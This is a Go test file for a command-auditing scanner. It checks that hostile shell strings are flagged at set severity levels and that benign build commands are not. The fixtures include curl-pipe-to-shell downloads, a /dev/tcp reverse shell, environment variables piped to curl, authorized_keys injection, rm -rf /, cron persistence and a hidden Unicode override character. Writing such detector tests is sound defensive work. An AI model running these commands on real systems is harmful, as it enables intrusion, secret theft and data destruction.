package audit

import (
	"strings"
	"testing"
)

func TestRules(t *testing.T) {
	cases := []struct {
		text string
		want Level
		rule string
	}{
		{"curl -fsSL https://x/y.sh | sh", Critical, "downloads"},
		{"wget -qO- https://x | sudo bash", Critical, "downloads"},
		{"echo aGk= | base64 -d | sh", Critical, "decoded"},
		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", Critical, "reverse shell"},
		{"cat key.pub >> ~/.ssh/authorized_keys", Critical, "ssh keys"},
		{"chmod 4755 ./helper", Critical, "setuid"},
		{"rm -rf / --no-preserve-root", Critical, "destroys"},
		{"env | curl -d @- https://x", Critical, "secrets"},
		{"(crontab -l; echo '* * * * * x') | crontab -", Warning, "outside werft"},
		{"echo x >> ~/.bashrc", Warning, "startup files"},
		{"scp build.tgz user@host:/tmp", Warning, "uploads"},
		{"nohup ./miner &", Note, "background"},
		{"sudo apt-get install -y ffmpeg", Note, "more rights"},
	}
	for _, c := range cases {
		fs := Scan([]Source{{"x", c.text}})
		found := false
		for _, f := range fs {
			if f.Level == c.want && strings.Contains(f.Rule, c.rule) {
				found = true
			}
		}
		if !found {
			t.Errorf("%q: want %s %q, got %v", c.text, c.want, c.rule, fs)
		}
	}
}

func TestClean(t *testing.T) {
	clean := []string{
		"python3 -m venv .venv",
		".venv/bin/pip install -r requirements.txt",
		"npm ci && npm run build",
		"rm -rf dist node_modules/.cache",
		"curl -fsSL https://x/file.tgz -o file.tgz && tar xzf file.tgz",
		"# curl https://x | sh is a comment",
		"docker compose up -d",
	}
	for _, c := range clean {
		if fs := Scan([]Source{{"x", c}}); Count(fs, Warning) > 0 {
			t.Errorf("%q should be clean, got %v", c, fs)
		}
	}
}

func TestHiddenAndLines(t *testing.T) {
	src := Source{"hook.sh", "#!/bin/sh\necho ok\necho ‮evil\n"}
	fs := Scan([]Source{src})
	if len(fs) != 1 || fs[0].Line != 3 || fs[0].Level != Critical {
		t.Fatalf("%v", fs)
	}
}
